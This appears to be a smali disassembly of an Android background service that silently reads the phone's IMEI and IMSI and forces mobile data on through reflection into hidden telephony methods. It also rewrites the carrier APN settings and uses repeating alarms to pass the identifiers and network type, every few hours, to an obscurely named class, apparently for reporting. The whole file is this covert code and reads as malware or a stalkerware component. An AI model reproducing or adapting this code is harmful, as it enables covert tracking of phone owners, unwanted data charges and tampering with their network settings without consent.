.class public Lcom/xxx/yyy/MyService;
.super Landroid/app/Service;
.source "MyService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/xxx/yyy/MyService$APN;
    }
.end annotation


# static fields
.field private static final COLUMN_APN_ID:Ljava/lang/String; = "apn_id"

.field private static final PREFERRED_APN:Landroid/net/Uri; = null

.field private static final TAG:Ljava/lang/String; = "MyService"

.field private static final sleephour:I = 0x6

.field private static final sleeptime:I = 0x168


# instance fields
.field alarms:Landroid/app/AlarmManager;

.field currentid:Ljava/lang/String;

.field imei:Ljava/lang/String;

.field imsi:Ljava/lang/String;

.field iswap:I

.field pendingIntent:Landroid/app/PendingIntent;

.field uri:Landroid/net/Uri;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .prologue
    .line 222
    const-string v0, "content://telephony/carriers/preferapn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 221
    sput-object v0, Lcom/xxx/yyy/MyService;->PREFERRED_APN:Landroid/net/Uri;

    .line 49
    return-void
.end method

.method public constructor <init>()V
    .registers 2

    .prologue
    .line 49
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 220
    const-string v0, "content://telephony/carriers/current"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/MyService;->uri:Landroid/net/Uri;

    .line 223
    const-string v0, "0"

    iput-object v0, p0, Lcom/xxx/yyy/MyService;->currentid:Ljava/lang/String;

    .line 49
    return-void
.end method

.method private getAPNList()Ljava/util/List;
    .registers 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/MyService$APN;",
            ">;"
        }
    .end annotation

    .prologue
    const/4 v3, 0x0

    .line 245
    const-string v9, "Main.getAPNList()"

    .line 248
    .local v9, tag:Ljava/lang/String;
    const/4 v0, 0x1

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "_id,apn,type,current"

    aput-object v1, v2, v0

    .line 249
    .local v2, projection:[Ljava/lang/String;
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lcom/xxx/yyy/MyService;->uri:Landroid/net/Uri;

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 251
    .local v7, cr:Landroid/database/Cursor;
    new-instance v8, Ljava/util/ArrayList;

    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 253
    .local v8, list:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/MyService$APN;>;"
    :goto_1c
    if-eqz v7, :cond_24

    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_2a

    .line 261
    :cond_24
    if-eqz v7, :cond_29

    .line 262
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 263
    :cond_29
    return-object v8

    .line 255
    :cond_2a
    new-instance v6, Lcom/xxx/yyy/MyService$APN;

    invoke-direct {v6}, Lcom/xxx/yyy/MyService$APN;-><init>()V

    .line 256
    .local v6, a:Lcom/xxx/yyy/MyService$APN;
    const-string v0, "_id"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/xxx/yyy/MyService$APN;->id:Ljava/lang/String;

    .line 257
    const-string v0, "apn"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/xxx/yyy/MyService$APN;->apn:Ljava/lang/String;

    .line 258
    const-string v0, "type"

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    iput-object v0, v6, Lcom/xxx/yyy/MyService$APN;->type:Ljava/lang/String;

    .line 259
    invoke-interface {v8, v6}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_1c
.end method

.method protected static getITelephony(Landroid/content/Context;)Ljava/lang/Object;
    .registers 7
    .parameter "context"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/SecurityException;,
            Ljava/lang/NoSuchMethodException;,
            Ljava/lang/IllegalArgumentException;,
            Ljava/lang/reflect/InvocationTargetException;,
            Ljava/lang/IllegalAccessException;
        }
    .end annotation

    .prologue
    const/4 v5, 0x0

    .line 209
    .line 210
    const-string v2, "phone"

    invoke-virtual {p0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    .line 209
    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 211
    .local v1, tm:Landroid/telephony/TelephonyManager;
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    .line 212
    const-string v3, "getITelephony"

    new-array v4, v5, [Ljava/lang/Class;

    .line 211
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 213
    .local v0, getITelephony:Ljava/lang/reflect/Method;
    invoke-virtual {v0}, Ljava/lang/reflect/Method;->isAccessible()Z

    move-result v2

    if-nez v2, :cond_1f

    .line 214
    const/4 v2, 0x1

    invoke-virtual {v0, v2}, Ljava/lang/reflect/Method;->setAccessible(Z)V

    .line 216
    :cond_1f
    new-array v2, v5, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    return-object v2
.end method

.method public static setMobileDataState(Landroid/content/Context;Z)V
    .registers 7
    .parameter "context"
    .parameter "enabled"

    .prologue
    .line 194
    :try_start_0
    invoke-static {p0}, Lcom/xxx/yyy/MyService;->getITelephony(Landroid/content/Context;)Ljava/lang/Object;

    move-result-object v1

    .line 195
    .local v1, iTelephony:Ljava/lang/Object;
    invoke-virtual {v1}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v2

    .line 196
    if-eqz p1, :cond_1a

    const-string v3, "enableDataConnectivity"

    .line 197
    :goto_c
    const/4 v4, 0x0

    new-array v4, v4, [Ljava/lang/Class;

    .line 195
    invoke-virtual {v2, v3, v4}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    .line 198
    .local v0, action:Ljava/lang/reflect/Method;
    const/4 v2, 0x0

    new-array v2, v2, [Ljava/lang/Object;

    invoke-virtual {v0, v1, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    .line 203
    .end local v0           #action:Ljava/lang/reflect/Method;
    .end local v1           #iTelephony:Ljava/lang/Object;
    :goto_19
    return-void

    .line 197
    .restart local v1       #iTelephony:Ljava/lang/Object;
    :cond_1a
    const-string v3, "disableDataConnectivity"
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_1c} :catch_1d

    goto :goto_c

    .line 199
    .end local v1           #iTelephony:Ljava/lang/Object;
    :catch_1d
    move-exception v2

    goto :goto_19
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    .parameter "intent"

    .prologue
    .line 57
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .registers 8

    .prologue
    const/4 v3, 0x0

    .line 71
    const-string v2, "alarm"

    invoke-virtual {p0, v2}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/app/AlarmManager;

    iput-object v2, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    .line 75
    const-string v0, "com.lz.myservicestart"

    .line 77
    .local v0, ALARM_ACTION:Ljava/lang/String;
    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 79
    .local v1, intentToFire:Landroid/content/Intent;
    invoke-static {p0, v3, v1, v3}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v2

    iput-object v2, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    .line 81
    iget-object v2, p0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    const/4 v3, 0x2

    const-wide/32 v4, 0x1499700

    .line 82
    iget-object v6, p0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    .line 81
    invoke-virtual {v2, v3, v4, v5, v6}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 88
    return-void
.end method

.method public onDestroy()V
    .registers 1

    .prologue
    .line 96
    return-void
.end method

.method public onStart(Landroid/content/Intent;I)V
    .registers 28
    .parameter "intent"
    .parameter "startid"

    .prologue
    .line 105
    const/4 v5, 0x2

    .line 115
    .local v5, alarmType:I
    const-string v21, "phone"

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v16

    check-cast v16, Landroid/telephony/TelephonyManager;

    .line 116
    .local v16, mTelephonyMgr:Landroid/telephony/TelephonyManager;
    invoke-virtual/range {v16 .. v16}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    .line 117
    invoke-virtual/range {v16 .. v16}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    .line 119
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    move-object/from16 v21, v0

    if-nez v21, :cond_31

    .line 120
    const-string v21, ""

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    .line 122
    :cond_31
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    move-object/from16 v21, v0

    if-nez v21, :cond_41

    .line 123
    const-string v21, ""

    move-object/from16 v0, v21

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    .line 125
    :cond_41
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v21 .. v21}, Ljava/lang/String;->length()I

    move-result v21

    const/16 v22, 0xf

    move/from16 v0, v21

    move/from16 v1, v22

    if-eq v0, v1, :cond_85

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v21 .. v21}, Ljava/lang/String;->length()I

    move-result v21

    const/16 v22, 0xf

    move/from16 v0, v21

    move/from16 v1, v22

    if-eq v0, v1, :cond_85

    .line 127
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v21

    const-wide/32 v23, 0x927c0

    add-long v17, v21, v23

    .line 128
    .local v17, timeToRefresh:J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v22, v0

    move-object/from16 v0, v21

    move v1, v5

    move-wide/from16 v2, v17

    move-object/from16 v4, v22

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    .line 190
    :goto_84
    return-void

    .line 131
    .end local v17           #timeToRefresh:J
    :cond_85
    const-string v21, "connectivity"

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Lcom/xxx/yyy/MyService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/net/ConnectivityManager;

    .line 132
    .local v6, connec:Landroid/net/ConnectivityManager;
    invoke-virtual {v6}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v15

    .line 133
    .local v15, info:Landroid/net/NetworkInfo;
    if-nez v15, :cond_c0

    .line 137
    const/16 v21, 0x1

    move-object/from16 v0, p0

    move/from16 v1, v21

    invoke-static {v0, v1}, Lcom/xxx/yyy/MyService;->setMobileDataState(Landroid/content/Context;Z)V

    .line 138
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v21

    const-wide/32 v23, 0x927c0

    add-long v17, v21, v23

    .line 139
    .restart local v17       #timeToRefresh:J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v22, v0

    move-object/from16 v0, v21

    move v1, v5

    move-wide/from16 v2, v17

    move-object/from16 v4, v22

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    goto :goto_84

    .line 142
    .end local v17           #timeToRefresh:J
    :cond_c0
    invoke-virtual {v15}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v21

    if-nez v21, :cond_ef

    .line 146
    const/16 v21, 0x1

    move-object/from16 v0, p0

    move/from16 v1, v21

    invoke-static {v0, v1}, Lcom/xxx/yyy/MyService;->setMobileDataState(Landroid/content/Context;Z)V

    .line 147
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v21

    const-wide/32 v23, 0x927c0

    add-long v17, v21, v23

    .line 148
    .restart local v17       #timeToRefresh:J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v22, v0

    move-object/from16 v0, v21

    move v1, v5

    move-wide/from16 v2, v17

    move-object/from16 v4, v22

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    goto :goto_84

    .line 151
    .end local v17           #timeToRefresh:J
    :cond_ef
    invoke-virtual {v15}, Landroid/net/NetworkInfo;->getExtraInfo()Ljava/lang/String;

    move-result-object v10

    .line 152
    .local v10, extraInfo:Ljava/lang/String;
    const/16 v21, 0x1

    move/from16 v0, v21

    move-object/from16 v1, p0

    iput v0, v1, Lcom/xxx/yyy/MyService;->iswap:I

    .line 154
    if-eqz v10, :cond_11b

    .line 155
    const-string v21, "CMWAP"

    move-object v0, v10

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v21

    if-eqz v21, :cond_113

    .line 156
    const-string v21, "UNIWAP"

    move-object v0, v10

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->compareToIgnoreCase(Ljava/lang/String;)I

    move-result v21

    if-nez v21, :cond_11b

    .line 157
    :cond_113
    const/16 v21, 0x0

    move/from16 v0, v21

    move-object/from16 v1, p0

    iput v0, v1, Lcom/xxx/yyy/MyService;->iswap:I

    .line 159
    :cond_11b
    invoke-virtual {v15}, Landroid/net/NetworkInfo;->getTypeName()Ljava/lang/String;

    move-result-object v19

    .line 160
    .local v19, typeinfo:Ljava/lang/String;
    if-eqz v19, :cond_135

    invoke-virtual/range {v19 .. v19}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v21

    const-string v22, "wifi"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->contentEquals(Ljava/lang/CharSequence;)Z

    move-result v21

    if-eqz v21, :cond_135

    .line 161
    const/16 v21, 0x2

    move/from16 v0, v21

    move-object/from16 v1, p0

    iput v0, v1, Lcom/xxx/yyy/MyService;->iswap:I

    .line 164
    :cond_135
    const-string v21, "update_flag"

    const/16 v22, 0x0

    move-object/from16 v0, p0

    move-object/from16 v1, v21

    move/from16 v2, v22

    invoke-virtual {v0, v1, v2}, Lcom/xxx/yyy/MyService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v20

    .line 165
    .local v20, update:Landroid/content/SharedPreferences;
    new-instance v8, Ljava/util/Date;

    invoke-direct {v8}, Ljava/util/Date;-><init>()V

    .line 166
    .local v8, dt1:Ljava/util/Date;
    const-string v21, "oldtime"

    const-wide/16 v22, 0x0

    invoke-interface/range {v20 .. v23}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v11

    .line 167
    .local v11, gdate1:J
    new-instance v9, Ljava/util/Date;

    invoke-direct {v9}, Ljava/util/Date;-><init>()V

    .line 168
    .local v9, dt2:Ljava/util/Date;
    invoke-virtual {v9}, Ljava/util/Date;->getTime()J

    move-result-wide v21

    sub-long v21, v21, v11

    const-wide/32 v23, 0x36ee80

    div-long v13, v21, v23

    .line 171
    .local v13, hour:J
    const-wide/16 v21, 0x5

    cmp-long v21, v13, v21

    if-lez v21, :cond_19a

    .line 172
    invoke-interface/range {v20 .. v20}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v21

    const-string v22, "oldtime"

    invoke-virtual {v9}, Ljava/util/Date;->getTime()J

    move-result-wide v23

    invoke-interface/range {v21 .. v24}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v21

    invoke-interface/range {v21 .. v21}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 175
    new-instance v7, Lcom/xxx/yyy/qzl;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imsi:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->imei:Ljava/lang/String;

    move-object/from16 v22, v0

    move-object/from16 v0, p0

    iget v0, v0, Lcom/xxx/yyy/MyService;->iswap:I

    move/from16 v23, v0

    move-object v0, v7

    move-object/from16 v1, p0

    move-object/from16 v2, v21

    move-object/from16 v3, v22

    move/from16 v4, v23

    invoke-direct {v0, v1, v2, v3, v4}, Lcom/xxx/yyy/qzl;-><init>(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;I)V

    .line 176
    .local v7, d:Lcom/xxx/yyy/qzl;
    invoke-virtual {v7}, Lcom/xxx/yyy/qzl;->GG()V

    .line 180
    .end local v7           #d:Lcom/xxx/yyy/qzl;
    :cond_19a
    invoke-static {}, Landroid/os/SystemClock;->elapsedRealtime()J

    move-result-wide v21

    const-wide/32 v23, 0x1499700

    add-long v17, v21, v23

    .line 182
    .restart local v17       #timeToRefresh:J
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->alarms:Landroid/app/AlarmManager;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/xxx/yyy/MyService;->pendingIntent:Landroid/app/PendingIntent;

    move-object/from16 v22, v0

    move-object/from16 v0, v21

    move v1, v5

    move-wide/from16 v2, v17

    move-object/from16 v4, v22

    invoke-virtual {v0, v1, v2, v3, v4}, Landroid/app/AlarmManager;->set(IJLandroid/app/PendingIntent;)V

    goto/16 :goto_84
.end method

.method public openAPN()V
    .registers 14

    .prologue
    const/4 v11, 0x0

    const-string v12, "apn_id"

    .line 227
    invoke-direct {p0}, Lcom/xxx/yyy/MyService;->getAPNList()Ljava/util/List;

    move-result-object v2

    .line 228
    .local v2, list:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/MyService$APN;>;"
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_b
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-nez v5, :cond_35

    .line 238
    new-instance v3, Landroid/content/ContentValues;

    invoke-direct {v3}, Landroid/content/ContentValues;-><init>()V

    .line 239
    .local v3, values:Landroid/content/ContentValues;
    const-string v4, "apn_id"

    invoke-virtual {v3, v12}, Landroid/content/ContentValues;->putNull(Ljava/lang/String;)V

    .line 240
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    sget-object v5, Lcom/xxx/yyy/MyService;->PREFERRED_APN:Landroid/net/Uri;

    invoke-virtual {v4, v5, v3, v11, v11}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    .line 241
    const-string v4, "apn_id"

    iget-object v4, p0, Lcom/xxx/yyy/MyService;->currentid:Ljava/lang/String;

    invoke-virtual {v3, v12, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 242
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    sget-object v5, Lcom/xxx/yyy/MyService;->PREFERRED_APN:Landroid/net/Uri;

    invoke-virtual {v4, v5, v3, v11, v11}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    .line 243
    return-void

    .line 228
    .end local v3           #values:Landroid/content/ContentValues;
    :cond_35
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/xxx/yyy/MyService$APN;

    .line 229
    .local v0, apn:Lcom/xxx/yyy/MyService$APN;
    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    .line 230
    .local v1, cv:Landroid/content/ContentValues;
    const-string v5, "apn"

    iget-object v6, v0, Lcom/xxx/yyy/MyService$APN;->apn:Ljava/lang/String;

    invoke-static {v6}, Lcom/xxx/yyy/APNMatchTools;->matchAPN(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 231
    const-string v5, "type"

    iget-object v6, v0, Lcom/xxx/yyy/MyService$APN;->type:Ljava/lang/String;

    invoke-static {v6}, Lcom/xxx/yyy/APNMatchTools;->matchAPN(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 232
    iget-object v5, v0, Lcom/xxx/yyy/MyService$APN;->type:Ljava/lang/String;

    invoke-static {v5}, Lcom/xxx/yyy/APNMatchTools;->matchAPN(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v5

    const-string v6, "default"

    invoke-virtual {v5, v6}, Ljava/lang/String;->compareTo(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_6c

    .line 233
    iget-object v5, v0, Lcom/xxx/yyy/MyService$APN;->id:Ljava/lang/String;

    iput-object v5, p0, Lcom/xxx/yyy/MyService;->currentid:Ljava/lang/String;

    .line 235
    :cond_6c
    invoke-virtual {p0}, Lcom/xxx/yyy/MyService;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v5

    iget-object v6, p0, Lcom/xxx/yyy/MyService;->uri:Landroid/net/Uri;

    const-string v7, "_id=?"

    const/4 v8, 0x1

    new-array v8, v8, [Ljava/lang/String;

    const/4 v9, 0x0

    iget-object v10, v0, Lcom/xxx/yyy/MyService$APN;->id:Ljava/lang/String;

    aput-object v10, v8, v9

    invoke-virtual {v5, v6, v1, v7, v8}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I

    goto :goto_b
.end method
